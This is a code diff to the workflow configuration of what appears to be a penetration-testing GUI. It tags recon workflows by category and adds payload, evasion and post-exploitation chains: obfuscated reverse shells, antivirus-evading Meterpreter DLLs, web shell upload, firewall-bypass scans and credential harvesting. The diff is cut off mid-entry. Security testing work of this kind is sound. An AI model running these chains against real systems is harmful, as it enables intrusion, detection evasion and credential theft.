@@ -161,23 +161,27 @@ class ReconSuperpower:
         # metasploit: (module, target_option, extra_options)
         self.scan_profiles = {
             "nmap": {
+                "category": "reconnaissance",
                 "Quick Scan": ("-sS", "T4", "1-1000", ""),
                 "Deep Scan": ("-sS -sV -sC", "T3", "1-65535", "-A"),
                 "Stealth Scan": ("-sS", "T1", "1-1000", "-f"),
                 "UDP Scan": ("-sU", "T3", "53,161,500", "")
             },
             "gobuster": {
+                "category": "reconnaissance",
                 "Quick Dir": ("dir", "10", "php,html,txt", "-k"),
                 "Deep Dir": ("dir", "50", "php,html,txt,asp,aspx,jsp,js,json,xml", "-k"),
                 "DNS Enum": ("dns", "20", "", ""),
                 "VHost Scan": ("vhost", "10", "", "-k")
             },
             "nikto": {
+                "category": "reconnaissance",
                 "Quick": ("80", False, "x", ""),
                 "SSL Scan": ("443", True, "x", ""),
                 "Targeted": ("80", False, "4,6,9", "")
             },
             "sqlmap": {
+                "category": "reconnaissance",
                 "Basic": ("--batch", "--smart", "1"),
                 "Full Scan": ("--batch --forms --crawl=3", "--level=5 --risk=3", "5"),
                 "Quick Test": ("--batch", "--level=1 --risk=1", "1"),
@@ -185,6 +189,7 @@ class ReconSuperpower:
                 "Table Dump": ("--batch --tables", "--level=3 --risk=2", "3")
             },
             "metasploit": {
+                "category": "reconnaissance",
                 "Port Scanner": ("auxiliary/scanner/portscan/tcp", "RHOSTS", "PORTS=1-1000"),
                 "SMB Version": ("auxiliary/scanner/smb/smb_version", "RHOSTS", ""),
                 "SSH Version": ("auxiliary/scanner/ssh/ssh_version", "RHOSTS", ""),
@@ -1973,13 +1978,55 @@ Adjustable:  Yes (via Settings)
 """
         }
 
+        # Workflow Categories for UI organization and filtering
+        self.workflow_categories = {
+            "reconnaissance": {
+                "category": "reconnaissance",
+                "name": "🔍 Reconnaissance",
+                "description": "Information gathering and enumeration",
+                "color": "#66D9EF"  # Accent cyan
+            },
+            "attack": {
+                "category": "attack",
+                "name": "⚔️ Attack Workflows",
+                "description": "Advanced attack patterns and exploitation",
+                "color": "#F92672"  # Accent red
+            },
+            "payloads": {
+                "category": "payloads",
+                "name": "💣 Payload Generation",
+                "description": "Obfuscated shells and exploit payloads",
+                "color": "#FD971F"  # Accent orange
+            },
+            "evasion": {
+                "category": "evasion",
+                "name": "🥷 Evasion & Obfuscation",
+                "description": "AV bypasses and detection evasion",
+                "color": "#AE81FF"  # Accent purple
+            },
+            "post_exploit": {
+                "category": "post_exploit",
+                "name": "🔓 Post-Exploitation",
+                "description": "Privilege escalation and lateral movement",
+                "color": "#E6DB74"  # Accent yellow
+            },
+            "all": {
+                "category": "reconnaissance",
+                "name": "📋 All Workflows",
+                "description": "Show all available workflows",
+                "color": "#A6E22E"  # Accent green
+            }
+        }
+
         # Pre-defined Workflows for automation
         # Workflow modes explanation:
         # - passive_steps: No direct interaction with target (uses third-party data sources)
         # - active_steps: Direct interaction with target (sends packets/requests to target)
         self.predefined_workflows = {
             "full_recon": {
+                "category": "reconnaissance",
                 "name": "Full Network Reconnaissance",
+                "category": "reconnaissance",
                 "description": "Comprehensive scan: ports → services → web → DNS → SQLi",
                 "passive_steps": [
                     {
@@ -2068,6 +2115,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "web_deep_scan": {
+                "category": "reconnaissance",
                 "name": "Web Application Deep Scan",
                 "description": "Comprehensive web application security assessment",
                 "passive_steps": [
@@ -2150,6 +2198,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "domain_intel": {
+                "category": "reconnaissance",
                 "name": "Domain Intelligence Gathering",
                 "description": "Comprehensive domain reconnaissance",
                 "passive_steps": [
@@ -2230,6 +2279,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "smb_enum": {
+                "category": "reconnaissance",
                 "name": "Windows/SMB Enumeration",
                 "description": "Comprehensive SMB/Windows enumeration with vuln checks",
                 "passive_steps": [
@@ -2303,6 +2353,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "cloud_discovery": {
+                "category": "reconnaissance",
                 "name": "Cloud Asset Discovery",
                 "description": "S3 buckets → GitHub credentials → Infrastructure",
                 "passive_steps": [
@@ -2378,6 +2429,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "quick_host": {
+                "category": "reconnaissance",
                 "name": "Quick Host Discovery",
                 "description": "Fast host reconnaissance",
                 "passive_steps": [
@@ -2420,6 +2472,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ad_recon": {
+                "category": "attack",
                 "name": "Active Directory Reconnaissance",
                 "description": "Full AD enumeration: LDAP → Kerberos → SMB → Users",
                 "passive_steps": [
@@ -2492,6 +2545,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "web_pentest": {
+                "category": "attack",
                 "name": "Web Application Pentesting",
                 "description": "Complete web app assessment with vuln scanning",
                 "passive_steps": [
@@ -2583,6 +2637,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "external_perimeter": {
+                "category": "reconnaissance",
                 "name": "External Perimeter Assessment",
                 "description": "External recon for red team operations",
                 "passive_steps": [
@@ -2649,6 +2704,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "internal_sweep": {
+                "category": "reconnaissance",
                 "name": "Internal Network Sweep",
                 "description": "Internal network discovery and enumeration",
                 "passive_steps": [
@@ -2708,6 +2764,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "api_security": {
+                "category": "reconnaissance",
                 "name": "API Security Assessment",
                 "description": "REST API security testing workflow",
                 "passive_steps": [
@@ -2779,6 +2836,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "credential_hunt": {
+                "category": "reconnaissance",
                 "name": "Credential Hunting",
                 "description": "Search for exposed credentials across services",
                 "passive_steps": [
@@ -2839,6 +2897,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ssl_assessment": {
+                "category": "reconnaissance",
                 "name": "SSL/TLS Assessment",
                 "description": "Certificate and encryption testing",
                 "passive_steps": [
@@ -2890,6 +2949,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "service_audit": {
+                "category": "reconnaissance",
                 "name": "Network Services Audit",
                 "description": "Comprehensive service enumeration",
                 "passive_steps": [
@@ -2960,6 +3020,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "stealth_recon": {
+                "category": "reconnaissance",
                 "name": "Stealth Reconnaissance",
                 "description": "Low and slow recon for evading detection",
                 "passive_steps": [
@@ -3000,6 +3061,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "full_stack": {
+                "category": "reconnaissance",
                 "name": "Full Stack Assessment",
                 "description": "Complete infrastructure assessment",
                 "passive_steps": [
@@ -3015,6 +3077,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "vuln_assessment": {
+                "category": "reconnaissance",
                 "name": "Vulnerability Assessment",
                 "description": "Comprehensive vulnerability scanning",
                 "passive_steps": [
@@ -3028,6 +3091,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "database_hunt": {
+                "category": "reconnaissance",
                 "name": "Database Discovery",
                 "description": "Find and enumerate database services",
                 "passive_steps": [
@@ -3041,6 +3105,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "mail_server_recon": {
+                "category": "reconnaissance",
                 "name": "Mail Server Reconnaissance",
                 "description": "Email infrastructure enumeration",
                 "passive_steps": [
@@ -3053,6 +3118,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "sqli_assessment": {
+                "category": "attack",
                 "name": "SQL Injection Assessment",
                 "description": "Complete SQLi testing",
                 "passive_steps": [
@@ -3067,6 +3133,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "network_mapper": {
+                "category": "reconnaissance",
                 "name": "Complete Network Mapper",
                 "description": "Full network topology mapping",
                 "passive_steps": [
@@ -3080,6 +3147,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "web_vuln_hunter": {
+                "category": "reconnaissance",
                 "name": "Web Vulnerability Hunter",
                 "description": "Comprehensive web vulnerability assessment",
                 "passive_steps": [
@@ -3095,6 +3163,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "osint_gather": {
+                "category": "reconnaissance",
                 "name": "OSINT Intelligence Gathering",
                 "description": "Open source intelligence collection",
                 "passive_steps": [
@@ -3109,6 +3178,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "password_hunt": {
+                "category": "reconnaissance",
                 "name": "Password & Secret Hunter",
                 "description": "Hunt for exposed passwords and secrets",
                 "passive_steps": [
@@ -3123,6 +3193,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "infrastructure_map": {
+                "category": "reconnaissance",
                 "name": "Infrastructure Mapping",
                 "description": "Map complete IT infrastructure",
                 "passive_steps": [
@@ -3136,6 +3207,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "api_pentest": {
+                "category": "attack",
                 "name": "API Penetration Testing",
                 "description": "Comprehensive API security testing",
                 "passive_steps": [
@@ -3151,6 +3223,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "subdomain_hunter": {
+                "category": "reconnaissance",
                 "name": "Subdomain Hunter",
                 "description": "Aggressive subdomain enumeration",
                 "passive_steps": [
@@ -3165,6 +3238,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "cloud_pentest": {
+                "category": "attack",
                 "name": "Cloud Security Audit",
                 "description": "Comprehensive cloud security assessment",
                 "passive_steps": [
@@ -3177,6 +3251,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "red_team_initial": {
+                "category": "reconnaissance",
                 "name": "Red Team Initial Access",
                 "description": "Initial access reconnaissance for red team",
                 "passive_steps": [
@@ -3191,6 +3266,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "blue_team_audit": {
+                "category": "reconnaissance",
                 "name": "Blue Team Security Audit",
                 "description": "Defensive security assessment",
                 "passive_steps": [
@@ -3208,6 +3284,7 @@ Adjustable:  Yes (via Settings)
             # NEW POWERFUL PENTESTING WORKFLOWS
             # ============================================
             "bug_bounty_recon": {
+                "category": "reconnaissance",
                 "name": "Bug Bounty Recon",
                 "description": "Comprehensive bug bounty reconnaissance workflow",
                 "passive_steps": [
@@ -3229,6 +3306,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "easm_scan": {
+                "category": "reconnaissance",
                 "name": "External Attack Surface Mapping",
                 "description": "Map complete external attack surface for an organization",
                 "passive_steps": [
@@ -3247,6 +3325,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "iot_assessment": {
+                "category": "reconnaissance",
                 "name": "IoT/OT Security Assessment",
                 "description": "Security assessment for IoT and OT devices",
                 "passive_steps": [
@@ -3264,6 +3343,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ransomware_exposure": {
+                "category": "reconnaissance",
                 "name": "Ransomware Exposure Assessment",
                 "description": "Check for common ransomware attack vectors",
                 "passive_steps": [
@@ -3281,6 +3361,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "zero_trust_audit": {
+                "category": "reconnaissance",
                 "name": "Zero Trust Architecture Audit",
                 "description": "Audit network segmentation and zero trust controls",
                 "passive_steps": [
@@ -3296,6 +3377,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "lateral_movement_paths": {
+                "category": "reconnaissance",
                 "name": "Lateral Movement Path Analysis",
                 "description": "Identify potential lateral movement paths in network",
                 "passive_steps": [
@@ -3311,6 +3393,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ci_cd_security": {
+                "category": "reconnaissance",
                 "name": "CI/CD Pipeline Security",
                 "description": "Assess CI/CD pipeline security posture",
                 "passive_steps": [
@@ -3326,6 +3409,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "kubernetes_recon": {
+                "category": "reconnaissance",
                 "name": "Kubernetes Cluster Recon",
                 "description": "Kubernetes cluster security reconnaissance",
                 "passive_steps": [
@@ -3340,6 +3424,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "docker_security": {
+                "category": "reconnaissance",
                 "name": "Docker/Container Security",
                 "description": "Docker and container security assessment",
                 "passive_steps": [
@@ -3354,6 +3439,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "graphql_assessment": {
+                "category": "reconnaissance",
                 "name": "GraphQL API Assessment",
                 "description": "GraphQL endpoint security testing",
                 "passive_steps": [
@@ -3368,6 +3454,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "oauth_oidc_assessment": {
+                "category": "reconnaissance",
                 "name": "OAuth/OIDC Security Assessment",
                 "description": "OAuth and OpenID Connect security testing",
                 "passive_steps": [
@@ -3382,6 +3469,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "wireless_assessment": {
+                "category": "reconnaissance",
                 "name": "Wireless Infrastructure Assessment",
                 "description": "Wireless network and controller security assessment",
                 "passive_steps": [
@@ -3395,6 +3483,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "voip_assessment": {
+                "category": "reconnaissance",
                 "name": "VoIP Security Assessment",
                 "description": "Voice over IP infrastructure security testing",
                 "passive_steps": [
@@ -3408,6 +3497,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "medical_device_assessment": {
+                "category": "reconnaissance",
                 "name": "Medical Device/HIPAA Assessment",
                 "description": "Healthcare and medical device security assessment",
                 "passive_steps": [
@@ -3422,6 +3512,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "pos_retail_assessment": {
+                "category": "reconnaissance",
                 "name": "POS/Retail System Assessment",
                 "description": "Point of Sale and retail system security testing",
                 "passive_steps": [
@@ -3436,6 +3527,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "scada_ics_assessment": {
+                "category": "reconnaissance",
                 "name": "SCADA/ICS Security Assessment",
                 "description": "Industrial Control System security testing",
                 "passive_steps": [
@@ -3451,6 +3543,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "financial_pci_assessment": {
+                "category": "reconnaissance",
                 "name": "Financial/PCI-DSS Assessment",
                 "description": "PCI-DSS compliance and financial system security",
                 "passive_steps": [
@@ -3466,6 +3559,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "email_security_assessment": {
+                "category": "reconnaissance",
                 "name": "Email Security Assessment",
                 "description": "Comprehensive email infrastructure security testing",
                 "passive_steps": [
@@ -3482,6 +3576,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "vpn_gateway_assessment": {
+                "category": "reconnaissance",
                 "name": "VPN Gateway Assessment",
                 "description": "VPN and remote access gateway security testing",
                 "passive_steps": [
@@ -3497,6 +3592,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ldap_ad_assessment": {
+                "category": "reconnaissance",
                 "name": "LDAP/Active Directory Assessment",
                 "description": "LDAP and Active Directory security testing",
                 "passive_steps": [
@@ -3512,6 +3608,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "web_cache_poisoning": {
+                "category": "reconnaissance",
                 "name": "Web Cache Poisoning Assessment",
                 "description": "Test for web cache poisoning vulnerabilities",
                 "passive_steps": [
@@ -3526,6 +3623,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ssrf_detection": {
+                "category": "reconnaissance",
                 "name": "SSRF Vulnerability Assessment",
                 "description": "Server-Side Request Forgery detection and testing",
                 "passive_steps": [
@@ -3540,6 +3638,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "xxe_injection_assessment": {
+                "category": "attack",
                 "name": "XXE Injection Assessment",
                 "description": "XML External Entity injection testing",
                 "passive_steps": [
@@ -3553,6 +3652,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "insecure_deserialization": {
+                "category": "reconnaissance",
                 "name": "Insecure Deserialization Assessment",
                 "description": "Test for insecure deserialization vulnerabilities",
                 "passive_steps": [
@@ -3568,6 +3668,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "jwt_security_assessment": {
+                "category": "attack",
                 "name": "JWT Security Assessment",
                 "description": "JSON Web Token security testing",
                 "passive_steps": [
@@ -3582,6 +3683,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ssti_assessment": {
+                "category": "reconnaissance",
                 "name": "SSTI Assessment",
                 "description": "Server-Side Template Injection testing",
                 "passive_steps": [
@@ -3596,6 +3698,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "nosql_injection": {
+                "category": "attack",
                 "name": "NoSQL Injection Assessment",
                 "description": "NoSQL database injection testing",
                 "passive_steps": [
@@ -3611,6 +3714,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "privilege_escalation_audit": {
+                "category": "reconnaissance",
                 "name": "Privilege Escalation Audit",
                 "description": "Identify privilege escalation vectors",
                 "passive_steps": [
@@ -3624,6 +3728,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "supply_chain_assessment": {
+                "category": "reconnaissance",
                 "name": "Supply Chain Security Assessment",
                 "description": "Third-party and supply chain security audit",
                 "passive_steps": [
@@ -3638,6 +3743,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "compliance_baseline": {
+                "category": "reconnaissance",
                 "name": "Security Compliance Baseline",
                 "description": "General security compliance baseline check",
                 "passive_steps": [
@@ -3653,6 +3759,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "shadow_it_discovery": {
+                "category": "reconnaissance",
                 "name": "Shadow IT Discovery",
                 "description": "Discover unauthorized IT assets and services",
                 "passive_steps": [
@@ -3671,6 +3778,7 @@ Adjustable:  Yes (via Settings)
             # ACTIVE-FOCUSED RECONNAISSANCE WORKFLOWS
             # ============================================
             "aggressive_port_scan": {
+                "category": "reconnaissance",
                 "name": "⚡ Aggressive Full Port Scan",
                 "description": "Complete 65535 port scan with aggressive service detection",
                 "passive_steps": [
@@ -3684,6 +3792,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "web_pentesting_suite": {
+                "category": "attack",
                 "name": "⚡ Web Application Pentesting Suite",
                 "description": "Comprehensive active web application security testing",
                 "passive_steps": [
@@ -3701,6 +3810,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "exploitation_recon": {
+                "category": "attack",
                 "name": "⚡ Exploitation Reconnaissance",
                 "description": "Identify exploitable services and known vulnerabilities",
                 "passive_steps": [
@@ -3718,6 +3828,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "credential_audit": {
+                "category": "attack",
                 "name": "⚡ Credential & Authentication Audit",
                 "description": "Test for weak credentials and authentication flaws",
                 "passive_steps": [
@@ -3739,6 +3850,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "database_pentest": {
+                "category": "attack",
                 "name": "⚡ Database Penetration Testing",
                 "description": "Comprehensive database security assessment",
                 "passive_steps": [
@@ -3759,6 +3871,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "network_pivoting": {
+                "category": "reconnaissance",
                 "name": "⚡ Network Pivoting Assessment",
                 "description": "Identify potential pivot points for lateral movement",
                 "passive_steps": [
@@ -3775,6 +3888,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "service_fingerprint": {
+                "category": "reconnaissance",
                 "name": "⚡ Deep Service Fingerprinting",
                 "description": "Comprehensive service version and configuration detection",
                 "passive_steps": [
@@ -3793,6 +3907,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "internal_network_sweep": {
+                "category": "reconnaissance",
                 "name": "⚡ Internal Network Active Sweep",
                 "description": "Comprehensive internal network reconnaissance sweep",
                 "passive_steps": [],
@@ -3808,6 +3923,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "firewall_evasion_test": {
+                "category": "evasion",
                 "name": "⚡ Firewall Evasion Testing",
                 "description": "Test firewall rules and identify bypass techniques",
                 "passive_steps": [],
@@ -3823,6 +3939,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "initial_foothold_vectors": {
+                "category": "reconnaissance",
                 "name": "⚡ Initial Foothold Vectors",
                 "description": "Red team initial access vector identification",
                 "passive_steps": [
@@ -3841,6 +3958,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "web_api_exploitation": {
+                "category": "attack",
                 "name": "⚡ Web API Exploitation Recon",
                 "description": "API security testing and vulnerability discovery",
                 "passive_steps": [
@@ -3857,6 +3975,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "smb_shares_attack": {
+                "category": "attack",
                 "name": "⚡ SMB Shares Attack Surface",
                 "description": "Comprehensive SMB share enumeration and access testing",
                 "passive_steps": [
@@ -3874,6 +3993,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "rdp_attack_surface": {
+                "category": "attack",
                 "name": "⚡ RDP Attack Surface Analysis",
                 "description": "Remote Desktop Protocol security assessment",
                 "passive_steps": [
@@ -3889,6 +4009,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "ssh_attack_surface": {
+                "category": "attack",
                 "name": "⚡ SSH Attack Surface Analysis",
                 "description": "Secure Shell security assessment and enumeration",
                 "passive_steps": [
@@ -3904,6 +4025,7 @@ Adjustable:  Yes (via Settings)
                 ]
             },
             "full_active_recon": {
+                "category": "reconnaissance",
                 "name": "⚡ FULL ACTIVE RECONNAISSANCE",
                 "description": "Complete active-only reconnaissance suite - all tools, maximum coverage",
                 "passive_steps": [],
@@ -3924,6 +4046,377 @@ Adjustable:  Yes (via Settings)
                     {"tool": "metasploit", "name": "SMB Version", "config": {"module": "auxiliary/scanner/smb/smb_version", "threads": "10"}},
                     {"tool": "metasploit", "name": "SMB Shares", "config": {"module": "auxiliary/scanner/smb/smb_enumshares", "threads": "10"}},
                     {"tool": "metasploit", "name": "MS17-010 Check", "config": {"module": "auxiliary/scanner/smb/smb_ms17_010", "threads": "5"}}
+                ]
+            },
+            # NEW: Payload Generation Workflows
+            "powershell_obfuscated_shell": {
+                "category": "payloads",
+                "name": "PowerShell Obfuscated Shell",
+                "category": "payloads",
+                "description": "Generate heavily obfuscated PowerShell reverse shell with Base64 encoding",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "shellz",
+                        "name": "Generate Obfuscated PowerShell Shell",
+                        "config": {
+                            "shell_type": "PowerShell",
+                           "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    }
+                ]
+            },
+            "multi_format_shell": {
+                "category": "payloads",
+                "name": "Multi-Format Shell Generator",
+                "category": "payloads",
+                "description": "Generate reverse shells in multiple formats (Bash, Python, PowerShell, PHP)",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "shellz",
+                        "name": "Bash Reverse Shell",
+                        "config": {
+                            "shell_type": "Bash nc",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    },
+                    {
+                        "tool": "shellz",
+                        "name": "Python Reverse Shell",
+                        "config": {
+                            "shell_type": "Python",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    },
+                    {
+                        "tool": "shellz",
+                        "name": "PowerShell Reverse Shell",
+                        "config": {
+                            "shell_type": "PowerShell",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    },
+                    {
+                        "tool": "shellz",
+                        "name": "PHP Reverse Shell",
+                        "config": {
+                            "shell_type": "PHP",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    }
+                ]
+            },
+            "msfvenom_evasion": {
+                "category": "evasion",
+                "name": "MSFVenom Evasion Payload",
+                "category": "evasion",
+                "description": "Generate AV-evading Windows payload with Shikata Ga Nai encoding",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "shellz",
+                        "name": "Generate Encoded Payload",
+                        "config": {
+                            "category": "MSFVenom Payloads",
+                            "shell_type": "Windows x64 Meterpreter",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]",
+                            "encoder": "x86/shikata_ga_nai",
+                            "iterations": "10"
+                        }
+                    }
+                ]
+            },
+            "multi_encoding_obfuscator": {
+                "category": "evasion",
+                "name": "Multi-Encoding Payload Obfuscator",
+                "category": "evasion",
+                "description": "Apply multiple encoding layers (Base64 → URL → Hex) to evade detection",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "encoders",
+                        "name": "Base64 Encoding",
+                        "config": {
+                            "type": "Base64",
+                            "input": "[TARGET_PAYLOAD]"
+                        }
+                    },
+                    {
+                        "tool": "encoders",
+                        "name": "URL Encoding",
+                        "config": {
+                            "type": "URL Encode",
+                            "input": "{{previous_output}}"
+                        }
+                    },
+                    {
+                        "tool": "encoders",
+                        "name": "Hex Encoding",
+                        "config": {
+                            "type": "Hex",
+                            "input": "{{previous_output}}"
+                        }
+                    }
+                ]
+            },
+            "linux_privesc_enum": {
+                "category": "post_exploit",
+                "name": "Linux Privilege Escalation Enumeration",
+                "category": "post_exploit",
+                "description": "Enumerate Linux system for privilege escalation vectors (SUID, capabilities, cron)",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "lolol",
+                        "name": "SUID Binary Search",
+                        "config": {
+                            "platform": "GTFOBins",
+                            "binary": "find",
+                            "escalation_type": "SUID"
+                        }
+                    },
+                    {
+                        "tool": "nmap",
+                        "name": "Local Service Scan",
+                        "config": {
+                            "scan_type": "VERSION",
+                            "target": "127.0.0.1",
+                            "ports": "1-65535",
+                            "timing": "T4"
+                        }
+                    }
+                ]
+            },
+            "windows_cred_harvest": {
+                "category": "post_exploit",
+                "name": "Windows Credential Harvesting",
+                "category": "post_exploit",
+                "description": "Enumerate Windows credentials and SMB shares for sensitive data",
+                "passive_steps": [
+                    {
+                        "tool": "githarvester",
+                        "name": "GitHub Credential Search",
+                        "config": {
+                            "query": "password OR credential OR api_key filetype:txt",
+                            "account": "[TARGET_ORG]",
+                            "sort": "new"
+                        }
+                    }
+                ],
+                "active_steps": [
+                    {
+                        "tool": "enum4linux",
+                        "name": "Windows Enumeration",
+                        "config": {
+                            "all_enum": True,
+                            "target": "[TARGET_IP]"
+                        }
+                    },
+                    {
+                        "tool": "metasploit",
+                        "name": "SMB Share Enumeration",
+                        "config": {
+                            "module": "auxiliary/scanner/smb/smb_enumshares",
+                            "threads": "10"
+                        }
+                    }
+                ]
+            },
+            "firewall_bypass_recon": {
+                "category": "evasion",
+                "name": "Firewall Bypass Reconnaissance",
+                "category": "evasion",
+                "description": "Use fragmentation and slow timing to evade firewall/IDS detection",
+                "passive_steps": [
+                    {
+                        "tool": "shodan",
+                        "name": "Passive Firewall Detection",
+                        "config": {
+                            "search_type": "search",
+                            "query": "hostname:[TARGET_DOMAIN] firewall"
+                        }
+                    }
+                ],
+                "active_steps": [
+                    {
+                        "tool": "nmap",
+                        "name": "Fragmented Stealth Scan",
+                        "config": {
+                            "scan_type": "SYN",
+                            "timing": "T1",
+                            "ports": "80,443,8080,8443",
+                            "extra_options": "-f --data-length 24 -D RND:5"
+                        }
+                    },
+                    {
+                        "tool": "gobuster",
+                        "name": "Slow Directory Enum",
+                        "config": {
+                            "mode": "dir",
+                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/common.txt",
+                            "threads": "3",
+                            "extra_options": "--delay 3s"
+                        },
+                        "condition": "http_detected"
+                    }
+                ]
+            },
+            "web_shell_deploy": {
+                "category": "attack",
+                "name": "Web Shell Upload & Exploit",
+                "category": "attack",
+                "description": "Discover upload points and generate web shells for deployment",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "gobuster",
+                        "name": "Upload Point Discovery",
+                        "config": {
+                            "mode": "dir",
+                            "wordlist": "/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt",
+                            "extensions": "php,asp,aspx,jsp",
+                            "threads": "20"
+                        }
+                    },
+                    {
+                        "tool": "shellz",
+                        "name": "PHP Web Shell Generator",
+                        "config": {
+                            "shell_type": "PHP",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    },
+                    {
+                        "tool": "nikto",
+                        "name": "Upload Vulnerability Scan",
+                        "config": {
+                            "port": "80",
+                            "ssl": False,
+                            "tuning": "9"  # File upload
+                        }
+                    }
+                ]
+            },
+            "buffer_overflow_payload": {
+                "category": "payloads",
+                "name": "Buffer Overflow Payload Generator",
+                "category": "payloads",
+                "description": "Generate buffer overflow payloads with pattern creation and bad character filtering",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "metasploit",
+                        "name": "Pattern Create (2000 bytes)",
+                        "config": {
+                            "module": "pattern_create",
+                            "length": "2000"
+                        }
+                    },
+                    {
+                        "tool": "shellz",
+                        "name": "Shellcode Generation",
+                        "config": {
+                            "shell_type": "Linux x86 Reverse",
+                            "ip": "[TARGET_IP]",
+                            "port": "[TARGET_PORT]"
+                        }
+                    }
+                ]
+            },
+            "dll_injection_workflow": {
+                "category": "attack",
+                "name": "DLL Injection Attack Chain",
+                "category": "attack",
+                "description": "Generate malicious DLL and enumerate injection points on Windows target",
+                "passive_steps": [],
+                "active_steps": [
+                    {
+                        "tool": "metasploit",
+                        "name": "Generate Malicious DLL",
+                        "config": {
+                            "module": "payload",
+                            "payload_type": "windows/meterpreter/reverse_tcp",
+                            "lhost": "[TARGET_IP]",
+                            "lport": "[TARGET_PORT]",
+                            "format": "dll"
+                        }
+                    },
+                    {
+                        "tool": "nmap",
+                        "name": "SMB Service Detection",
+                        "config": {
+                            "scan_type": "VERSION",
+                            "ports": "445",
+                            "scripts": "smb-enum-processes,smb-enum-services"
+                        }
+                    },
+                    {
+                        "tool": "enum4linux",
+                        "name": "Windows Process Enumeration",
+                        "config": {
+                            "all_enum": True
+                        }
+                    }
+                ]
+            },
+            "ad_attack_chain": {
+                "category": "attack",
+                "name": "Active Directory Attack Chain",
+                "category": "attack",
